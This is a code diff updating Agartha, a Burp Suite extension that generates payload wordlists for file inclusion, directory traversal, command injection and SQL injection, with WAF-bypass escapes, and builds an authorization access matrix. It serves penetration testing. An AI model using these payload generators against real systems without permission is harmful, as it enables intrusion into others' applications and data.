@@ -4,7 +4,7 @@ Author: Volkan Dindar
         https://github.com/volkandindar/agartha
 """
 try:
-    import sys, re, urlparse, random
+    import sys, re, urlparse, random, os, urllib, posixpath
     from burp import (IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory)
     from java.awt import (BorderLayout, FlowLayout, Color, Font, Dimension, Toolkit)
     from javax.swing import (JCheckBox, JMenuItem, JTextPane, JTable, JScrollPane, JProgressBar, SwingConstants, JComboBox, JButton, JTextField, JSplitPane, JPanel, JLabel, JRadioButton, ButtonGroup, JTabbedPane, BoxLayout, JEditorPane)
@@ -16,14 +16,14 @@ try:
 except:
     print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"
 
-VERSION = "0.9"
+VERSION = "1.0"
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
     
     def registerExtenderCallbacks(self, callbacks):
         self._callbacks = callbacks
         self._helpers = callbacks.getHelpers()
-        self._callbacks.setExtensionName("Agartha {LFI|RCE|SQLi|Auth|Http->Js}")        
+        self._callbacks.setExtensionName("Agartha - LFI, RCE, SQLi, Auth Matrix, HTTP to JS")
         self._MainTabs = JTabbedPane()
         self._tabDictUI()
         self._tabAuthUI()
@@ -35,7 +35,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         callbacks.registerContextMenuFactory(self)
         callbacks.issueAlert("The extension has been loaded.")
         self.tableMatrixReset(self)
-        print "Agartha(v" + VERSION + ") is a security tool for:\n\t\t* Local File Inclusion, Directory Traversal,\n\t\t* Command Injection, Code Execution,\n\t\t* SQL Injections,\n\t\t* Authentication/Authorization Access Matrix,\n\t\t* Http request to Javascript conversion.\n\nFor more information and tutorial how to use, please visit:\n\t\thttps://github.com/volkandindar/agartha\n\nAuthor:\tVolkan Dindar\n\t\t\t\tvolkan.dindar@owasp.org"
+        print "Agartha(v" + VERSION + ") is a security tool for:\n\t\t* Local File Inclusion, Directory Traversal\n\t\t* Command Injection, RCE\n\t\t* SQL Injections\n\t\t* Access Violations, Authentication/Authorization Matrix\n\t\t* Http request to Javascript conversion\n\nFor more information and tutorial, please visit:\n\t\thttps://github.com/volkandindar/agartha\n\nAuthor:\n\t\tVolkan Dindar\n\t\tvolkan.dindar@owasp.org"
         return
 
     def authMatrixThread(self, ev):
@@ -76,7 +76,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._btnAuthReset.setEnabled(True)
         self._cbAuthGETPOST.setEnabled(True)
         self.progressBar.setValue(1000000)
-        self._lblAuthNotification.text = "Blue, Green, Purple and Beige colors are representation of users. Yellow, Orange and Red cell colors show warning severities."        
+        self._lblAuthNotification.text = "Blue, Green, Purple and Beige colors are representation of users. Yellow, Orange and Red cell colors show warning levels."        
         return
 
     def makeHttpCall(self, urlAdd, userID):
@@ -100,7 +100,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 if self._cbAuthGETPOST.getSelectedIndex() == 1:
                     header = self._callbacks.getHelpers().toggleRequestMethod((header))
             else:
-                # request was in POST method and will be in GET
+                # request was in POST alike method and will be in GET
                 if self._cbAuthGETPOST.getSelectedIndex() == 0:
                     header = self._callbacks.getHelpers().toggleRequestMethod((header))
 
@@ -114,7 +114,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             _httpReqRes = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(urlparse.urlparse(urlAdd).hostname, portNum, urlparse.urlparse(urlAdd).scheme), header)
             self.httpReqRes[userID].append(_httpReqRes)
             
-            return "HTTP " + str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode()) + " : " + format(len(self._helpers.bytesToString(_httpReqRes.getResponse())) - self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset(), ',d') + "bytes"
+            return "HTTP " + str(self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getStatusCode()) + " : " + format(len(self._helpers.bytesToString(_httpReqRes.getResponse())) - self._helpers.analyzeResponse(self._helpers.bytesToString(_httpReqRes.getResponse())).getBodyOffset(), ',d') + " bytes"
         except:
             return str(sys.exc_info()[1])
 
@@ -127,21 +127,21 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             _url = _url.strip()
             if not self.isURLValid(str(_url)) or _url == self._txtURLDefault:
                 self._tbAuthURL.setForeground (Color.red)
-                self._lblAuthNotification.text = "Please check url list!"
+                self._lblAuthNotification.text = "URLs should start with 'http/s' and not have any spaces. Please check: '" + _url + "'"
                 self._lblAuthNotification.setForeground (Color.red)
                 return
         self._tbAuthURL.setForeground (Color.black)
 
-        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault or not self._tbAuthHeader.getText().split('\n')[0].count(' ') == 2:
+        if not self._tbAuthHeader.getText().strip() or self._tbAuthHeader.getText().strip() == self._txtHeaderDefault:
             self._tbAuthHeader.setForeground (Color.red)
             self._lblAuthNotification.text = "Please provide a valid header!"
             self._lblAuthNotification.setForeground (Color.red)
             return
         self._tbAuthHeader.setForeground (Color.black)
 
-        if self._tbAuthNewUser.text in self.userNames:
+        if self._tbAuthNewUser.text.strip() in self.userNames or not self._tbAuthNewUser.text.strip() or len(self._tbAuthNewUser.text.strip()) > 20:
             self._tbAuthNewUser.setForeground (Color.red)
-            self._lblAuthNotification.text = "Please add another user name!"
+            self._lblAuthNotification.text = "Please add another user name, that must be unique and less then 20 chars!"
             self._lblAuthNotification.setForeground (Color.red)
             return
         self._tbAuthNewUser.setForeground (Color.black)
@@ -157,18 +157,18 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             self.userNamesHttpReq[0] = unauthHeader
         
         self.userCount = self.userCount + 1
-        self.userNames.append(self._tbAuthNewUser.text)
+        self.userNames.append(self._tbAuthNewUser.text.strip())
         self.userNamesHttpReq.append(self._tbAuthHeader.getText())
-        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text)
+        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text.strip())
         self.userNamesHttpUrls.append([])
 
         urlList = []
-        for x in range(0,self.tableMatrix.getRowCount()):
+        for x in range(0, self.tableMatrix.getRowCount()):
                 urlList.append(str(self.tableMatrix.getValueAt(x, 0)))
-        
         for _url in set(self._tbAuthURL.getText().split('\n')):
             _url = _url.strip()
-            if _url and not any(re.findall(r'(log|sign).*(off|out)', _url, re.IGNORECASE)):
+            _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
+            if _url and not any(re.findall(r'(log|sign|time).*(off|out|in|on)|(error|expire|kill|terminat|delete|remove)', _url, re.IGNORECASE)) and not any(re.findall(r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff|woff2|ttf)$', _ext, re.IGNORECASE)):
                 # ignore logout, signoff, etc. paths
                 if _url not in self.userNamesHttpUrls[self.userCount]:
                     # check first if the url exist in user's url list
@@ -177,10 +177,10 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                         # check table if url exists
                         self.tableMatrix_DM.addRow([_url])
         
-        self._tbAuthURL.setText("")
+        self._tbAuthURL.setText(self._tbAuthURL.getText().split('\n')[0]+"\n")
         self._btnAuthRun.setEnabled(True)
         self._btnAuthReset.setEnabled(True)
-        self._lblAuthNotification.text = self._tbAuthNewUser.text + " added successfully!"
+        self._lblAuthNotification.text = "'" + self._tbAuthNewUser.text.strip() + "'' added successfully! Possible session terminators (log|sign|time - off|out|in|on), and file extensions (gif, jpg, jpeg, png, css, js, ico, svg, eot, woff, woff2, ttf) have been filtered out!"
         self._lblAuthNotification.setForeground (Color.black)
         self._cbAuthColoring.setEnabled(True)
         self._cbAuthGETPOST.setEnabled(True)
@@ -210,13 +210,6 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             self._cbUnionDepth.setEnabled(False)
         return
 
-    def _cbOrderBasedFunc(self, ev):
-        if self._cbOrderBased.isSelected(): 
-            self._cbOrderDepth.setEnabled(True)
-        else:
-            self._cbOrderDepth.setEnabled(False)
-        return
-
     def funcGeneratePayload(self, ev):
         self._lblStatusLabel.setForeground (Color.red)
         self._tabDictResultDisplay.setText("")
@@ -243,9 +236,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         return
        
     def isValid(self):
-        # input should not be empty
-        # and input should contain at least one alphanumeric char
-        if self._txtTargetPath.text.strip() and re.compile("[0-9a-zA-Z]").findall(self._txtTargetPath.text) and self._txtTargetPath.text.strip() !=self._txtDefaultLFI and self._txtTargetPath.text.strip() !=self._txtDefaultCommandInj:
+        # input should not be empty, should contain at least one alphanumeric char and less than 250 length
+        if self._txtTargetPath.text.strip() and re.compile("[0-9a-zA-Z]").findall(self._txtTargetPath.text) and self._txtTargetPath.text.strip() !=self._txtDefaultLFI and self._txtTargetPath.text.strip() !=self._txtDefaultCommandInj and len(self._txtTargetPath.text.strip()) < 250:
             # clear
             return True
         else:
@@ -280,22 +272,23 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
     def funcCommandInj(self, ev):
         listCommandInj = []        
-        prefixes = ["", "\\n", "\\r\\n", "%0a", "%0d%0a"]
-        escapeChars = ["",  "'", "\\'", "\"", "\\\""]
+        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "%0d%0a"]
+        escapeChars = ["",  "'", "\\'", "\\\\'", "\"", "\\\"", "\\\\\""]
         separators = ["&", "&&", "|", "||", ";"]
         
         for prefix in prefixes:
-            for separator in separators:
-                for escapeChar in escapeChars:
+            for escapeChar in escapeChars:
+                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                        continue
+                for separator in separators:
                     listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + escapeChar + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + escapeChar + "\n")
-                
                 listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")
                 listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + "\n")
-            
             listCommandInj.append(prefix + self._txtTargetPath.text + "\n")
             listCommandInj.append(prefix + "`" + self._txtTargetPath.text + "`" + "\n")
 
@@ -336,9 +329,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "...") + "\n")
                 listLFI.append((_upperDirectory + self._txtTargetPath.text).replace("..", "....") + "\n")
 
-                prefixes = ["/", "\\", "/..;/", "..;/"]
+                prefixes = ["/", "\\", "/..;/", "..;/", ".//"]
                 for prefix in prefixes:
                     listLFI.append(prefix + _upperDirectory + filePath + "\n")
+                    if not "\\" in prefix and not "/..;/" in prefix :
+                        listLFI.append(_upperDirectory + prefix + filePath + "\n")
 
                 suffixes = ["%00index.html", "%20index.html", "%09index.html", "%0Dindex.html", "%FFindex.html", "%00", "%20", "%09", "%0D", "%FF", ";index.html", "%00.jpg", "%00.jpg", "%20.jpg", "%09.jpg", "%0D.jpg", "%FF.jpg"]
                 for suffix in suffixes:
@@ -396,19 +391,18 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 self._lblStatusLabel.setText('There is no a generic method exists for this choice! Please also pick a database!')
                 self._tabDictResultDisplay.setText('')
                 return
-        if not (self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected() or self._cbBooleanBased.isSelected() or self._cbOrderBased.isSelected()):
+        if not (self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected() or self._cbBooleanBased.isSelected()):
                 self._lblStatusLabel.setForeground (Color.red)
                 self._lblStatusLabel.setText('There is no a generic method exists for this choice! Please also pick an attack type!')
                 self._tabDictResultDisplay.setText('')
                 return
 
         listSQLi = []
-        prefixes = ["", "\\n", "\\r\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
-        escapeChars = ["", "'", "\\'"]
+        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
+        escapeChars = ["", "'", "\\'", "\\\\'"]
         if not self._cbSqlWafBypass.isSelected():
             prefixes = [""]
             escapeChars = ["", "'"]
-
         n1 = str(random.randint(10, 70))
         n2 = str(random.randint(71, 99))
         boolExpressions = [n1 + "=" + n1, n1 + "<" + n2]
@@ -418,6 +412,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         if self._cbBooleanBased.isSelected():
             for prefix in prefixes:
                 for escapeChar in escapeChars:
+                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                            continue
                     for boolExpression in boolExpressions:
                         for suffix in suffixes[1:]:
                             listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
@@ -425,26 +422,22 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                                 listSQLi.append(prefix + " or " + boolExpression + "\n")
             for prefix in prefixes:
                 for escapeChar in escapeChars[1:]:
+                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                            continue
                     for suffix in suffixes[1:]:
                         listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
                         listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                         listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
                         listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
-        
-
-        if self._cbOrderBased.isSelected():
-            for prefix in prefixes:
-                for escapeChar in escapeChars:
-                    for suffix in suffixes[1:]:
-                        for i in range(int(self._cbOrderDepth.getSelectedItem())):
-                            listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + suffix + "\n")
-                            if not escapeChar:
-                                listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + "\n")
 
         unions = ["null", "1337", "'1337'"]
         if self._cbUnionBased.isSelected():
             for prefix in prefixes:
                 for escapeChar in escapeChars:
+                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                            continue
                     for suffix in suffixes[1:]:
                         for union in unions:
                             unionPhrase = " union all select "
@@ -517,6 +510,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
         for prefix in prefixes:
             for escapeChar in escapeChars:
+                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                        continue
                 for suffix in suffixes[1:]:
                     if self._cbOracleBased.isSelected():
                         if self._cbStackedSQL.isSelected():
@@ -647,7 +643,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
     def createMenuItems(self, invocation):
         self.context = invocation
         menu_list = ArrayList()
-        menu_list.add(JMenuItem("Agartha Panel", actionPerformed=self.agartha_menu))
+        menu_list.add(JMenuItem("Authorization Matrix", actionPerformed=self.agartha_menu))
         menu_list.add(JMenuItem("Copy as JavaScript", actionPerformed=self.js_menu))
         return menu_list
 
@@ -680,10 +676,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 contentType = ""
                 for _reqLine in _req.splitlines():
                     if any(re.findall(r'Content-type', _reqLine, re.IGNORECASE)):
-                        contentType = _reqLine.split(" ", 1)[1]
-                        break
-                if contentType:
-                    contentType = "xhr.setRequestHeader('Content-type','" + contentType + "');"
+                        contentType = "xhr.setRequestHeader('Content-type','" + _reqLine.split(" ", 1)[1] + "');"
+                        break                    
                 
                 sendData = ""
                 if _req.splitlines()[-1]:
@@ -717,6 +711,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._MainTabs.setSelectedComponent(self._tabAuthSplitpane)
         self._MainTabs.getParent().setSelectedComponent(self._MainTabs)
 
+        if _req.splitlines()[0].split(" ", 1)[0] == "GET":
+            self._cbAuthGETPOST.setSelectedIndex(0)
+        else:
+            self._cbAuthGETPOST.setSelectedIndex(1)
+
     def authMatrix(self, ev):
         t = Thread(target=self.authMatrixThread, args=[self])
         t.start()
@@ -737,24 +736,14 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             self._responseViewer.setMessage("", False)
     
     def isURLValid(self, urlAdd):
-        if " " in urlAdd.strip():
-            # check if space exists
-            return False
-        elif urlAdd.strip().startswith("http://") or urlAdd.startswith("https://"):
-            # check if it starts with http
+        if (urlparse.urlparse(urlAdd) and urlAdd.strip().startswith("http") and not " " in urlAdd.strip()) or urlAdd.isspace() or not urlAdd:
             return True
-        elif not urlAdd:
-            # check if whitespace exists
-            return True
-        elif urlAdd.isspace():
-            # check if only spaces
-            return True    
         else:
             return False
 
     def _tabAuthUI(self):
         # panel top
-        self._tbAuthNewUser = JTextField("", 15)
+        self._tbAuthNewUser = JTextField("", 14)
         self._tbAuthNewUser.setToolTipText("Please provide an username.")
         self._btnAuthNewUserAdd = JButton("Add User", actionPerformed=self.authAdduser)
         self._btnAuthNewUserAdd.setPreferredSize(Dimension(90, 27))
@@ -762,14 +751,18 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._btnAuthRun = JButton("RUN", actionPerformed=self.authMatrix)
         self._btnAuthRun.setPreferredSize(Dimension(150, 27))
         self._btnAuthRun.setToolTipText("Execute the task.")
+        self._btnSiteMapGeneratorRun = JButton("SiteMap", actionPerformed=self.siteMapGenerator)
+        self._btnSiteMapGeneratorRun.setPreferredSize(Dimension(90, 27))
+        self._btnSiteMapGeneratorRun.setToolTipText("Generate user's sitemap and populate URL list automatically.")
+        self._btnAuthRun.setEnabled(True)
         self._btnAuthReset = JButton("Reset", actionPerformed=self.tableMatrixReset)
         self._btnAuthReset.setPreferredSize(Dimension(90, 27))
         self._btnAuthReset.setToolTipText("Clear all.")
         self._btnAuthRun.setEnabled(False)
-        self._btnAuthReset.setEnabled(False)       
+        self._btnAuthReset.setEnabled(False)
         self._tbAuthHeader = JTextPane()
         self._tbAuthHeader.setContentType("text")
-        self._tbAuthHeader.setToolTipText("HTTP header belongs to the user. You can set up this field from right click: 'Extensions > Agartha'.")
+        self._tbAuthHeader.setToolTipText("HTTP header belongs to the user. You can set up this field from right click: 'Extensions > Agartha > Authorization Matrix'.")
         self._tbAuthHeader.setEditable(True)
         self._tbAuthURL = JTextPane()
         self._tbAuthURL.setContentType("text")
@@ -781,6 +774,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._cbAuthGETPOST = JComboBox(('GET', 'POST'))
         self._cbAuthGETPOST.setSelectedIndex(0)
         self._cbAuthGETPOST.setToolTipText("Which HTTP method will be used for the test.")
+
+        self._cbSiteMapDepth = JComboBox(('Only current URL', 'Max crawl depth is 1', 'Max crawl depth is 2', 'Max crawl depth is 3', 'Max crawl depth is 4', 'Max crawl depth is 5', 'Max crawl depth is 6', 'Max crawl depth is 7', 'Max crawl depth is 8', 'Max crawl depth is 9', 'Max crawl depth is 10'))
+        self._cbSiteMapDepth.setPreferredSize(Dimension(150, 27))
+        self._cbSiteMapDepth.setSelectedIndex(3)
+        self._cbSiteMapDepth.setToolTipText("Webpage spider depth. How many sub-links should the web crawler go?")
 
         # top panel
         _tabAuthPanel1 = JPanel(BorderLayout())
@@ -794,6 +792,8 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         _tabAuthPanel1_A.add(self._btnAuthReset)
         _tabAuthPanel1_A.add(self._btnAuthRun)
         _tabAuthPanel1_A.add(self._cbAuthColoring)
+        _tabAuthPanel1_A.add(self._btnSiteMapGeneratorRun)
+        _tabAuthPanel1_A.add(self._cbSiteMapDepth)
         _tabAuthPanel1_B = JScrollPane(self._tbAuthHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
         _tabAuthPanel1_C = JScrollPane(self._tbAuthURL, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
         self._tabAuthSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthPanel1_B, _tabAuthPanel1_C)
@@ -805,7 +805,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         # panel center
         self._lblAuthNotification = JLabel("", SwingConstants.LEFT)
         self.tableMatrix = []
-        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLS','NoAuth'))
+        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
         self.tableMatrix = JTable(self.tableMatrix_DM)        
         self.tableMatrix.setAutoCreateRowSorter(False)
         self.tableMatrix.setSelectionForeground(Color.red)
@@ -850,66 +850,142 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self.editorPaneInfo = JEditorPane()
         self.editorPaneInfo.setEditable(False)
         self.editorPaneInfo.setContentType("text/html");
-        htmlString ="<html>"
-        htmlString +="<div><h3>Author: Volkan Dindar,  Github Repo: https://github.com/volkandindar/agartha</h3>"
-        htmlString +="<h1>Agartha { LFI | RCE | Auth | SQL Injection | Http->Js }</h1>"
-        htmlString +="<p>Agartha is a penetration testing tool which creates dynamic payload lists and user access matrix to reveal injection flaws and authentication/authorization issues. There are many different attack payloads alredy exist, but Agartha creates run-time, systematic and vendor-neutral payloads with many different possibilities and bypassing methods. It also draws attention to user session and URL relationships, which makes easy to find user access violations. And additionally, it converts Http requests to JavaScript to help digging up XSS issues more. In summary:</p><ul>"
-        htmlString +="<li><strong>Payload Generator</strong>: It creates payloads/wordlists for different attack types.<ul>"
-        htmlString +="<li><strong>Local File Inclusion, Directory Traversal</strong>: It creates file dictionary lists with various encoding and escaping characters.</li>"
-        htmlString +="<li><strong>Command Injection / Remote Code Execution</strong>: It creates command dictionary lists for both unix and windows environments with different combinations.</li>"
-        htmlString +="<li><strong>SQL Injection</strong>: It creates Stacked Queries, Boolean-Based, Union-Based, Time-Based and Order-Based SQL Injection wordlist for various databases to help finding vulnerable spots.</li></ul></li>"
-        htmlString +="<li><strong>Authorization Matrix</strong>: It creates an access role matrix based on user sessions and URL lists to determine authorization/authentication related access violation issues.</li>"
-        htmlString +="<li>And <strong>Http Request to JavaScript Converter</strong>: It converts Http requests to JavaScript code to be useful for further XSS exploitation and more.<br><br></li></ul>"
-        htmlString +="<h2>Local File Inclusion, Directory Traversal</h2>"
-        htmlString +="<p>It both supports unix and windows file systems. You can generate any wordlists dynamically for the path you want. You just need to supply a file path and that's all.</p>"
-        htmlString +="<p><strong>'Depth'</strong> is representation of how deep the wordlist should be. You can generate wordlists 'till' or 'equal to' this value.</p>"
-        htmlString +="<p><strong>'Waf Bypass'</strong> asks for if you want to include all bypass features; like null bytes, different encoding, etc.</p>"
-        htmlString +="<p><img width=\"1000\" alt=\"Images from Github Repo - Directory Traversal/Local File Inclusion wordlist\" src=\"https://user-images.githubusercontent.com/50321735/192443238-ac8f9913-9d35-4642-8122-aec89baa1b6f.png\" style=\"max-width: 100%;\"><br><br></p>"
-        htmlString +="<h2>Command Injection / Remote Code Execution</h2>"
-        htmlString +="<p>It creates command execution dynamic wordlists with the command you supply. It combines different separators and terminators for unix and windows environments together.</p>"
-        htmlString +="<p><strong>'URL Encoding'</strong> encodes dictionary output.</p>"
-        htmlString +="<p><img width=\"1000\" alt=\"Images from Github Repo - Remote Code Execution wordlist\" src=\"https://user-images.githubusercontent.com/50321735/192442838-fb338e2c-93f8-445c-ace6-af1c78131711.png\" style=\"max-width: 100%;\"><br><br></p>"
-        htmlString +="<h2>SQL Injection</h2>"
-        htmlString +="<p>It generates payloads for Stacked Queries, Boolean-Based, Union-Based, Time-Based, Order-Based SQL Injection attacks, and you do not need to supply any inputs. You just pick what type of SQL attacks and databases you want, then it will generate a wordlist with different combinations.</p>"
-        htmlString +="<p><strong>'URL Encoding'</strong> encodes dictionary output.</p>"
-        htmlString +="<p><strong>'Waf Bypass'</strong> asks for if you want to include all bypass features; like null bytes, different encoding, etc.</p>"
-        htmlString +="<p><strong>'Union-Based'</strong> and <strong>'Order-Based'</strong> ask for how deep the payload should be. The default value is 5.</p>"
-        htmlString +="<p>And the rest is related with database and attack types.</p>"
-        htmlString +="<p><img width=\"1000\" alt=\"Images from Github Repo - SQL Injection wordlist\" src=\"https://user-images.githubusercontent.com/50321735/192443768-a8113e64-3f56-4282-bd11-b2c3d91be53e.png\" style=\"max-width: 100%;\"><br><br></p>"
-        htmlString +="<h2>Authorization Matrix</h2>"
-        htmlString +="<p>This part focuses on user session and URLs relationships to determine access violations. The tool will visit all URLs from pre-defined user sessions and fill the table with all Http responses. It is a kind of access matrix and helps to find out authentication/authorization issues. Afterwards we will see what user can access what page contents.</p><ul>"
-        htmlString +="<li><strong>User session name</strong>: You can right click on any request and send it from 'Extensions > Agartha > Agartha Panel' to define a user session.</li>"
-        htmlString +="<li><strong>URL Addresses</strong> user can visit: You can use Burp's spider feature or any sitemap generators. You may need to provide different URLs for different users.</li>"
-        htmlString +="<li>After providing session name, Http header and allowed URLs you can use 'Add User' button to add it.</li></ul>"
-        htmlString +="<p><img width=\"1000\" alt=\"Images from Github Repo - Authorization Matrix, sending http req\" src=\"https://user-images.githubusercontent.com/50321735/152217672-353b42a8-bb06-4e92-b9af-3f4e487ab1fd.png\" style=\"max-width: 100%;\"></p>"
-        htmlString +="<p>After sending Http request to Agartha, the panel will fill some fields in the tool.</p><ol>"
-        htmlString +="<li>What's username for the session you provide. You can add up to 4 different users and each user will have a different color to make it more readable.<ul>"
-        htmlString +="<li>'Add User' for adding user session</li>"
-        htmlString +="<li>You can change HTTP request method between 'GET' and POST.</li>"
-        htmlString +="<li>'Reset' button clear all table and field contents.</li>"
-        htmlString +="<li>'Run' button execute the task.</li>"
-        htmlString +="<li>'Warnings' indicates possible issues in different colors.</li></ul></li>"
-        htmlString +="<li>User's request header and all user related URL visits will be based on it.</li>"
-        htmlString +="<li>URL addresses the user can visit. You can create this list with manual effort or automatic tools, like spiders, sitemap generators, etc, and do not forget to remove logout links.</li>"
-        htmlString +="<li>All URLs you supply will be in here. Also user cells will be colored, if the URL belongs to her/him.</li>"
-        htmlString +="<li>Http requests and responses without authentication. All session cookies, tokens and parameters will be removed form Http calls.</li>"
-        htmlString +="<li>Http requests and responses with the user session you define in the first step. Cell titles show Http response codes and response lengths.</li>"
-        htmlString +="<li>Just click the cell you want to examine and Http details will be shown in here.</li></ol>"
-        htmlString +="<p><img width=\"1000\" alt=\"Images from Github Repo - Role Matrix\" src=\"https://user-images.githubusercontent.com/50321735/192441769-1632b642-2048-4b10-a91b-ae2c4db3d111.png\" style=\"max-width: 100%;\"></p>"
-        htmlString +="<p>After clicking 'RUN', the tool will fill user and URL matrix with different colors. Besides the user colors, you will see orange, yellow and red cells. The URL address does not belong to the user and the cell color is:</p><ul>"
-        htmlString +="<li>Yellow, because the response returns 'HTTP 302' with authentication/authorization concerns</li>"
-        htmlString +="<li>Orange, because the response returns 'HTTP 200' but different content length, with authentication/authorization concerns</li>"
-        htmlString +="<li>Red, because the response returns 'HTTP 200' and same content length, with authentication/authorization concerns</li></ul>"
-        htmlString +="<p>You may also notice, it support only one Http request method and user session at the same time, because it processes bulk requests and it is not possible to provide different header options for each calls. But you may play with 'GET/POST' methods to see response differences.<br><br></p>"
-        htmlString +="<h2>Http Request to JavaScript Converter</h2>"
-        htmlString +="<p>The feature is for converting Http requests to JavaScript code. It can be useful to dig up further XSS issues and bypass header restrictions.</p>"
-        htmlString +="<p>To access it, right click any Http Request and 'Extensions > Agartha > Copy as JavaScript'.</p>"
-        htmlString +="<p><img width=\"1000\" alt=\"Images from Github Repo - Http Request to JavaScript Converter\" src=\"https://user-images.githubusercontent.com/50321735/152224405-d10b78a2-9b18-44a9-a991-5b9c451c7253.png\" style=\"max-width: 100%;\"></a></p>"
-        htmlString +="<p>It will automatically save it to your clipboard</p></div>"
-        htmlString +="<p>Please note that, the JavaScript code will be called over original user session and many header fields will be filled automatically by browsers. In some cases, the server may require some header field mandatory, and therefore you may need to modify the code for an adjustment.</p>"
-        htmlString +="</article>"
-        htmlString +="</div>"
-        htmlString +="</html>"
+        htmlString ="<html><body><table width=1000 border=0 cellspacing=0><tr><td><h3>Author:\t\t\tVolkan Dindar<br/>Github:\t\t\thttps://github.com/volkandindar/agartha</h3>"
+        htmlString += """
+        <h1>Agartha - LFI, RCE, SQLi, Auth, HTTP to JS</h1>
